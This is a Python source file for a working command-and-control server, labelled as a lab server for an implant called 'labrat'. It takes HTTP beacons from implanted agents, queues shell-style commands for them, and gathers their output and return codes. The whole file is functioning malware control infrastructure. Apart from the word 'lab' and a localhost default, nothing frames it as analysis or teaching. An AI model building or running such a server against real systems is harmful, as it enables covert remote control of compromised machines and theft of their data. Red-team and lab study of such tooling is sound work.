#!/usr/bin/env python3
"""Lab C2 server for labrat implant — JSON over HTTP POST /beacon."""

from __future__ import annotations

import argparse
import base64
import json
import threading
import uuid
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any

_lock = threading.Lock()
_tasks: dict[str, list[dict[str, Any]]] = {}
_results: dict[str, dict[str, Any]] = {}
_agents: dict[str, dict[str, Any]] = {}


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt: str, *args: Any) -> None:
        print(f"[c2] {self.address_string()} {fmt % args}")

    def _read_json(self) -> dict[str, Any]:
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length) if length else b""
        if not raw:
            return {}
        return json.loads(raw.decode("utf-8", errors="replace"))

    def _send_json(self, code: int, obj: dict[str, Any]) -> None:
        body = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self) -> None:
        data = self._read_json()
        path = self.path.split("?", 1)[0]

        if path != "/beacon":
            self._send_json(404, {"error": "not found"})
            return

        op = data.get("op", "")
        agent_id = str(data.get("id", "unknown"))

        with _lock:
            if op == "checkin":
                _agents[agent_id] = {"last": data, "count": _agents.get(agent_id, {}).get("count", 0) + 1}
                print(f"[checkin] {agent_id} (#{_agents[agent_id]['count']})")
                queue = _tasks.get(agent_id, [])
                if queue:
                    task = queue.pop(0)
                    self._send_json(200, task)
                else:
                    self._send_json(200, {"op": "sleep"})
                return

            if op == "result":
                task_id = str(data.get("task", ""))
                _results[task_id] = data
                stdout = data.get("stdout", "")
                preview = stdout[:120].replace("\n", " ")
                print(f"[result] {agent_id} task={task_id} rc={data.get('rc')} out={preview!r}")
                self._send_json(200, {"op": "ok"})
                return

        self._send_json(400, {"error": "bad op"})


def queue_task(agent_id: str, cmd: str, arg: str = "") -> str:
    task_id = uuid.uuid4().hex[:12]
    task = {"op": "task", "cmd": cmd, "arg": arg, "id": task_id}
    with _lock:
        _tasks.setdefault(agent_id, []).append(task)
    return task_id


def get_result(task_id: str, timeout: float = 30.0) -> dict[str, Any] | None:
    import time

    deadline = time.time() + timeout
    while time.time() < deadline:
        with _lock:
            if task_id in _results:
                return dict(_results[task_id])
        time.sleep(0.05)
    return None


def list_agents() -> list[str]:
    with _lock:
        return list(_agents.keys())


def run_server(host: str, port: int) -> HTTPServer:
    server = HTTPServer((host, port), C2Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[c2] listening on http://{host}:{port}/beacon")
    return server


def main() -> None:
    parser = argparse.ArgumentParser(description="labrat C2 server")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()
    server = run_server(args.host, args.port)
    try:
        while True:
            import time
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[c2] shutdown")
        server.shutdown()


if __name__ == "__main__":
    main()
